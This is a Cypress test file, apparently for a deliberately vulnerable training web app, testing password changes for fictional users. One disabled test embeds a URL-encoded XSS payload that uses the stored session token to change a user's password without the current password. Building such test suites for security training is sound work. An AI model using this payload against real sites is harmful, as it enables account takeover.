describe("/#/privacy-security/change-password", () => {
  describe("as Morty", () => {
    beforeEach(() => {
      cy.login({
        email: "morty",
        password: "focusOnScienceMorty!focusOnScience",
      });
      cy.visit("/#/privacy-security/change-password");
    });

    xit("should be able to change password", () => {
      cy.get("#currentPassword").type("focusOnScienceMorty!focusOnScience");
      cy.get("#newPassword").type("GonorrheaCantSeeUs!");
      cy.get("#newPasswordRepeat").type("GonorrheaCantSeeUs!");
      cy.get("#changeButton").click();

      cy.get(".confirmation").should("not.be.hidden");
    });
  });

  describe('challenge "changePasswordBenderChallenge"', () => {
    xit("should be able to change password via XSS-powered attack on password change without passing current password", () => {
      cy.login({
        email: "bender",
        password: "OhG0dPlease1nsertLiquor!",
      });
      cy.visit(
        "/#/search?q=%3Ciframe%20src%3D%22javascript%3Axmlhttp%20%3D%20new%20XMLHttpRequest%28%29%3B%20xmlhttp.open%28%27GET%27%2C%20%27http%3A%2F%2Flocalhost%3A3000%2Frest%2Fuser%2Fchange-password%3Fnew%3DslurmCl4ssic%26amp%3Brepeat%3DslurmCl4ssic%27%29%3B%20xmlhttp.setRequestHeader%28%27Authorization%27%2C%60Bearer%3D%24%7BlocalStorage.getItem%28%27token%27%29%7D%60%29%3B%20xmlhttp.send%28%29%3B%22%3E"
      );
      cy.wait(2000);
      cy.login({ email: "bender", password: "slurmCl4ssic" });
      cy.url().should("match", /\/search/);

      cy.expectChallengeSolved({ challenge: "Change Bender's Password" });
    });
  });
});
